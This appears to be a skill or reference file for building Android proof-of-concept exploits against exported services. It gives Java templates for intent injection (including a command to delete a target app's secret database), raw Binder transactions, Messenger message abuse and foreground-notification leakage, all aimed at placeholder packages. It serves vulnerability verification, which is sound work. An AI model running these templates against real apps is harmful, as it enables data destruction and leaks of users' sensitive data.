---
name: poc-app-service
description: Service PoC reference covering AIDL exposure, Messenger abuse, Intent injection, bind escalation, and foreground-notification leakage.
---

# Service PoC Reference

Exported or otherwise attacker-reachable Android services. Usually `direct-trigger` or `binder-caller` shapes.

## Construction Matrix

| Vulnerability | PoC shape | Typical support | Visible success |
|---|---|---|---|
| AIDL exposure | `binder-caller` | recreated Stub/interface | sensitive method returns data or accepts privileged action |
| Messenger abuse | `binder-caller` | none | target handler accepts attacker message |
| Intent injection | `direct-trigger` | none | service performs attacker-requested action |
| Bind escalation | `binder-caller` | recreated Binder wrapper | privileged Binder method succeeds |
| Foreground leak | `ui-assisted` | optional notification listener | sensitive notification text is visible or captured |

## Shared Inputs

Victim service class, exported or bindable status, required action/component/extras/message codes, Binder descriptor/transact code/`what`/`arg1`/`obj` protocol, visible success signal.

## Pattern 1 - Start-Service Trigger

For `onStartCommand()`-driven abuse.

```java
private static void runServiceIntentInject(Context context) {
    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.CommandService");
    intent.setAction("com.target.EXECUTE_COMMAND");
    intent.putExtra("command", "delete");
    intent.putExtra("target_path", "/data/data/com.target/databases/secret.db");
    context.startService(intent);
    Log.i("PoC", "Sent startService() trigger to com.target.CommandService");
}
```

```java
static {
    register("service-start", "Start Exported Service", () -> runServiceIntentInject(appContext));
}
```

## Pattern 2 - Bind And Binder Transaction

For exported AIDL or Binder exposure.

```java
private static void runServiceBinderTransact(
    Context context, String packageName, String serviceClass,
    String interfaceDescriptor, int transactCode
) {
    Intent intent = new Intent();
    intent.setClassName(packageName, serviceClass);

    ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Parcel input = Parcel.obtain();
            Parcel output = Parcel.obtain();
            try {
                input.writeInterfaceToken(interfaceDescriptor);
                service.transact(transactCode, input, output, 0);
                Log.i("PoC", "Binder transact finished for code " + transactCode);
            } catch (Exception e) {
                Log.e("PoC", "Binder transact failed", e);
            } finally {
                input.recycle();
                output.recycle();
                context.unbindService(this);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {}
    };

    boolean bound = context.bindService(intent, connection, Context.BIND_AUTO_CREATE);
    if (!bound) Log.w("PoC", "bindService() returned false for " + serviceClass);
}
```

```java
static {
    register("service-transact", "Bind And Call Binder Transaction", () -> {
        runServiceBinderTransact(appContext, "com.target", "com.target.VulnService", "com.target.IVulnService", 3);
    });
}
```

If a stable `.aidl` exists and compiles cleanly, using it is acceptable. Default to direct `transact(...)` when reconstructing full `.aidl` is unnecessary or fragile.

## Pattern 3 - Messenger Protocol Caller

For Messenger-backed service protocols.

```java
private static final ServiceConnection MESSENGER_CONNECTION = new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder binder) {
        try {
            Messenger messenger = new Messenger(binder);
            Message msg = Message.obtain();
            msg.what = 1;
            msg.obj = "malicious_command";
            messenger.send(msg);
            Log.i("PoC", "Sent attacker message to Messenger service");
        } catch (Exception e) {
            Log.e("PoC", "Messenger send failed", e);
        }
    }

    @Override
    public void onServiceDisconnected(ComponentName name) {}
};

private static void runServiceMessengerAbuse(Context context) {
    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.MsgService");
    context.bindService(intent, MESSENGER_CONNECTION, Context.BIND_AUTO_CREATE);
}
```

```java
static {
    register("service-messenger", "Send Messenger Command", () -> runServiceMessengerAbuse(appContext));
}
```

## Pattern 4 - Foreground-Notification Observation

For notification leakage rather than Binder control.

```java
private static void runForegroundLeak(Context context) {
    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.LeakyForegroundService");
    context.startService(intent);
    Log.i("PoC", "Started foreground service. Check whether notification exposes sensitive text.");
}
```

```java
static {
    register("service-foreground", "Start Foreground Service", () -> runForegroundLeak(appContext));
}
```
